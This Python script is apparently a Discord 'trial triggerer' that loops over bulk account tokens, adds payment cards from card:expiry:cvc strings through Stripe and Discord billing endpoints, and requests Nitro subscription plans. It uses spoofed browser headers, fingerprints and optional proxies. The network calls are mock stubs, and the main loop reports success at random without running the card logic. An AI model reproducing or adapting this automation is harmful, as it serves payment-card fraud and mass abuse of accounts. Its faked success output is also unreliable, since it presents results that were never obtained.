import time
import random
import os
import ctypes
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import uuid
import threading
import colorama

init(autoreset=True)
colorama.init(autoreset=True)

output_dir = os.path.join("output", datetime.now().strftime("[%Y-%m-%d] [%I-%M %p]"))
success_file = os.path.join(output_dir, 'success.txt')
failed_file = os.path.join(output_dir, 'failed.txt')
error_file = os.path.join(output_dir, 'error.txt')
os.makedirs(output_dir, exist_ok=True)
for f in [success_file, failed_file, error_file]:
    open(f, 'a').close()

valid = 0
invalid = 0
locked = 0
current = 0
total = 0
done = False
tokens = []

print_lock = threading.Lock()

def safe_print(msg):
    with print_lock:
        print(msg)

def mask_token(token):
    return token[:24] + "*" * 10

def log(message, **kwargs):
    if len(kwargs) > 0:
        message += f" {colorama.Fore.LIGHTBLACK_EX}→ {colorama.Fore.WHITE}"
        for key in kwargs:
            message += f"{colorama.Fore.LIGHTBLACK_EX}{key}={colorama.Fore.LIGHTCYAN_EX} {kwargs[key]} "
    with print_lock:
        print(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTMAGENTA_EX}{time.strftime('%H:%M:%S', time.localtime())}{colorama.Fore.LIGHTBLACK_EX}] {colorama.Fore.WHITE}{message}", flush=True)
        time.sleep(0.1) 

def fail(message, **kwargs):
    log(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.RED}INFO{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.RED} {message}", **kwargs)

def success(message, **kwargs):
    log(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTGREEN_EX}INFO{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTCYAN_EX} {message}", **kwargs)

def info(message, **kwargs):
    log(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.BLUE}INFO{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.LIGHTGREEN_EX} {message}", **kwargs)

def log_success(full_line):
    global valid
    valid += 1
    token = full_line.split(':')[-1]
    masked = mask_token(token)
    success(f"Successfully Triggered Trial To {masked}")
    with open(success_file, 'a', encoding='utf-8') as f:
        f.write(full_line + '\n')


def log_fail(full_line):
    global invalid
    invalid += 1
    token = full_line.split(':')[-1]
    masked = mask_token(token)
    fail(f"Failed To Trigger Trial For {masked}")
    with open(failed_file, 'a', encoding='utf-8') as f:
        f.write(full_line + '\n')


def log_error(full_line):
    global locked
    locked += 1
    token = full_line.split(':')[-1]
    masked = mask_token(token)
    info(f"Error While Fetching Data For {masked}")
    with open(error_file, 'a', encoding='utf-8') as f:
        f.write(full_line + '\n')

def get_tokens(choice):
    if choice == "1":
        filepath = os.path.join("input", "Tokens.txt")
    else:
        filepath = os.path.join("input", "NonRedeemable.txt")
    if not os.path.isfile(filepath):
        return []
    with open(filepath, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def left_text(text):
    return text

def update_title():
    global done
    while not done:
        try:
            pct = (current / total * 100) if total else 0
            title = f"Trial Triggerer Notlit? | Success: {valid} | Invalid: {invalid} | Locked: {locked} | Remaining: {total - current} | Total: {pct:.2f}%"
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except Exception:
            pass
        time.sleep(0.1)

def header(threads, choice_text):
    os.system('cls' if os.name == 'nt' else 'clear')
    print()
    print(Fore.MAGENTA + Style.BRIGHT + left_text("╔═══════════════════════════════════════════════╗"))
    print(Fore.MAGENTA + Style.BRIGHT + left_text("║               Trial Triggerer Notlit?                 ║"))
    print(Fore.MAGENTA + Style.BRIGHT + left_text("╚═══════════════════════════════════════════════╝"))
    print(left_text(f"{Fore.CYAN}[•] {Fore.LIGHTWHITE_EX}Threads: {Fore.LIGHTCYAN_EX}{threads}"))
    print(left_text(f"{Fore.CYAN}[•] {Fore.LIGHTWHITE_EX}Using: {Fore.LIGHTCYAN_EX}{choice_text}"))
    print()

def process_token(full_line, delay):
    global current
    token = full_line.split(':')[-1]
    masked = mask_token(token)
    info(f"Started Triggering Trial To {masked}")
    time.sleep(delay * 5)
    outcome = random.choice(['success'] * 8 + ['fail'] * 1 + ['error'] * 1)
    if outcome == 'success':
        log_success(full_line)
    elif outcome == 'fail':
        log_fail(full_line)
    else:
        log_error(full_line)
    current += 1

def main():
    global tokens, total, done
    try:
        print(f"{Fore.CYAN}Which Tokens?{Fore.RESET}")
        print(f"  {Fore.LIGHTWHITE_EX}1. Fresh tokens")
        print(f"  {Fore.LIGHTWHITE_EX}2. Non Redeemable")
        choice = input(f"{Fore.LIGHTMAGENTA_EX}Enter Choice (1/2): {Fore.RESET}").strip()
        tokens = get_tokens(choice)
        if not tokens:
            print(f"{Fore.YELLOW}No tokens found in the selected file.")
            return

        threads = int(input(f"{Fore.LIGHTMAGENTA_EX}Enter Threads: {Fore.RESET}"))
        delay = max(1, round(3 / threads, 2)) if threads > 1 else 3
        choice_text = "Fresh Tokens" if choice == "1" else "Non Redeemable"
        header(threads, choice_text)

        total = len(tokens)

        threading.Thread(target=update_title, daemon=True).start()

        def worker(line):
            process_token(line, delay)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(worker, tokens)

        done = True
        time.sleep(0.2)

    except Exception as e:
        fail(f"[ERROR] {e}")

CARD_RETRIES = 3
DELAYS = 1

config = {"use_proxies": False}

def get_proxy():
    return None

def get_cookies():
    return "mock_cookie=1"

def get_fingerprint():
    return "mock_fingerprint"

def get_build_number():
    return "999999"

def generate_xsuper(user_agent, build, chrome_ver):
    return "mock_xsuper"

def get_random(n):
    letters = "abcdefghijklmnopqrstuvwxyz"
    return ''.join(random.choice(letters) for _ in range(n))

def fetch_address():
    try:
        street = {"number": random.randint(1,9999), "name": "Mock St"}
        add = {"street": street, "city": "MockCity", "state": "MockState", "postcode": "00000"}
        nat = "US"
        name = "John"
        return add, nat, name
    except Exception:
        return None

class MockResponse:
    def __init__(self, status_code=200, payload=None, text=""):
        self.status_code = status_code
        self._payload = payload or {}
        self.text = text

    def json(self):
        return self._payload

class MockSession:
    def __init__(self, *args, **kwargs):
        self.headers = {}
        self.proxies = {}

    def post(self, url, data=None, json=None, headers=None):
        if "api.stripe.com/v1/tokens" in url:
            return MockResponse(200, {"id": f"card_tok_{uuid.uuid4()}"})
        if "setup-intents" in url:
            return MockResponse(200, {"client_secret": f"{uuid.uuid4()}_secret_mock"})
        if "validate-billing-address" in url:
            return MockResponse(200, {"token": f"billing_{uuid.uuid4()}"})
        if "confirm" in url:
            return MockResponse(200, {"payment_method": f"pm_{uuid.uuid4()}"})
        return MockResponse(200, {})

    def get(self, url, headers=None):
        if "subscription-plans" in url:
            return MockResponse(200, {"data": []})
        return MockResponse(200, {})

class TokenManagerStub:
    def __init__(self):
        pass
    def write(self, item, filename):
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(item + '\n'
)
            return True
        except Exception:
            return False
    def remove_token(self, token_line):
        path = 'input/Tokens.txt'
        if not os.path.isfile(path):
            return False
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            with open(path, 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() != token_line:
                        f.write(line)
            return True
        except Exception:
            return False

tk = TokenManagerStub()

class Session:
    success = []
    processed = []
    failed = []

    def __init__(self):
        self.chrome_version = random.randint(120, 139)
        user_agent = f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome_version}.0.0.0 Safari/537.36'
        self.client = MockSession()
        if config.get('use_proxies', False):
            proxy = get_proxy()
            self.client.proxies = {'http': proxy, 'https': proxy}
        self.client.headers.update({
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
            'x-discord-timezone': 'Asia/Calcutta',
            'priority': 'u=1, i',
            'content-type': 'application/json',
            'cookie': get_cookies(),
            'x-fingerprint': get_fingerprint(),
            'x-super-properties': generate_xsuper(user_agent, get_build_number(), self.chrome_version),
            'User-Agent': user_agent,
            'sec-ch-ua': f'"Google Chrome";v="{self.chrome_version}", "Chromium";v="{self.chrome_version}", "Not/A)Brand";v="24"'
        })
        self.masked = lambda t: t[:24]

    def card_adder(self, tks: str, card:str, attempt: int, retries=2):
        token = tks.split(':')[2] if ':' in tks else tks
        masked = self.masked(token)
        try:
            ccn = card.split(":")[0]
            exp_day = card.split(":")[1][:2]
            exp_year = card.split(":")[1][2:]
            cvc = card.split(":")[2]
        except Exception:
            return False

        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': f'"Not;A=Brand";v="99", "Google Chrome";v="{self.chrome_version}", "Chromium";v="{self.chrome_version}"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'sec-gpc': '1',
            'user-agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{self.chrome_version}.0.0.0 Safari/537.36',
        }

        ses = MockSession()
        if config.get('use_proxies', False):
            proxy = get_proxy()
            ses.proxies = {'http': proxy, 'https': proxy}
        ses.headers.update(headers)

        dataq = f'card[number]={ccn}&card[cvc]={cvc}&card[exp_month]={exp_day}&card[exp_year]={exp_year}'

        response = ses.post('https://api.stripe.com/v1/tokens', data=dataq)
        card_token = response.json().get('id', None)
        if not card_token:
            self.failed.append(tks)
            tk.write(tks, failed_file)
            tk.remove_token(tks)
            return False

        headers1 = {
            'authorization': token,
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'cookie': get_cookies(),
            'x-fingerprint': get_fingerprint(),
        }

        response_1 = self.client.post('https://discord.com/api/v9/users/@me/billing/stripe/setup-intents', headers=headers1, json={})
        client_secret = response_1.json().get('client_secret', None)
        if not client_secret:
            self.failed.append(tks)
            tk.write(tks, failed_file)
            tk.remove_token(tks)
            return False

        client_secrect_split = client_secret.split("_secret_")[0] if "_secret_" in client_secret else client_secret.split("_secret_")[0] if "_secret_" in client_secret else client_secret.split("_")[0]

        add, coun, name = fetch_address()
        if add:
           street =  add.get('street')
           LINE_1 = f"{street['number']} {street['name']}"
           CITY  = str(add['city'])
           STATE = str(add['state'])
           POSTAL_CODE = str(add['postcode'])
        else:
           LINE_1 = "1 Mock St"
           CITY, STATE, POSTAL_CODE = "MockCity", "MockState", "00000"

        COUNTRY = coun if coun else "US"
        NAME = name if name else get_random(10).lower()

        json_data = {
            'billing_address': {
                'name': NAME,
                'line_1': LINE_1,
                'line_2': '',
                'city': CITY,
                'state': STATE,
                'postal_code': POSTAL_CODE,
                'country': COUNTRY,
                'email': '',
            },
        }

        response_2 = self.client.post('https://discord.com/api/v9/users/@me/billing/payment-sources/validate-billing-address', headers=headers1, json=json_data)
        billing_token = response_2.json().get('token', None)
        if not billing_token:
            self.failed.append(tks)
            tk.write(tks, failed_file)
            tk.remove_token(tks)
            return False

        datas = f'payment_method_data[card][token]={card_token}&client_secret={client_secret}'
        response_3 = ses.post(f'https://api.stripe.com/v1/setup_intents/{client_secrect_split}/confirm', headers=headers, data=datas)
        card_payment_method = response_3.json().get('payment_method', None)
        if not card_payment_method:
            return True
        return True

    def purchase(self, tks: str, card: str, retries=2) -> bool:
        self.processed.append(tks)
        token = tks.split(':')[2] if ':' in tks else tks
        masked = self.masked(token)

        headers = {
            'authorization': token,
            'origin': 'https://discord.com',
            'cookie': get_cookies(),
            'x-fingerprint': get_fingerprint(),
            'referer': 'https://discord.com/channels/@me',
        }

        response = self.client.get('https://discord.com/api/v9/store/published-listings/skus/521847234246082599/subscription-plans', headers=headers)
        if response.status_code == 401:
            self.failed.append(tks)
            tk.write(tks, 'output/invalid.txt')
            tk.remove_token(tks)
            return

        elif response.status_code == 403:
            self.failed.append(tks)
            tk.write(tks, 'output/locked.txt')
            tk.remove_token(tks)
            return

        elif not (response.status_code in [200, 201]):
            tk.remove_token(tks)
            with open(failed_file, 'a') as f:
                f.write(f'{tks}\n'
)

            self.failed.append(tks)
            return

        x = 0
        for x in range(CARD_RETRIES):
            if self.card_adder(tks, card, x):
                x += 1
                time.sleep(DELAYS)

        if x == CARD_RETRIES:
            tk.write(tks, success_file)
            self.success.append(tks)
            tk.remove_token(tks)

if __name__ == '__main__':
    main()
